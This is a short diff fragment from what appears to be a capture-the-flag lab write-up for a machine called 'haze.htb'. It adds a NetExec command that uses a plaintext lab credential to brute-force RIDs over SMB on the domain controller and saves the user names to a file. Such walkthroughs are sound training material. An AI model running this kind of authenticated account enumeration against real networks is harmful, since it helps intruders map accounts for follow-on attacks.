@@ -341,5 +341,6 @@ SMB         10.129.11.223   445    DC01             1112: HAZE\Support_Services 
 I can adapt this command to write all the users from this output to a userfile
 
 ```python
-
+nxc smb dc01.haze.htb -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt
 ```
+
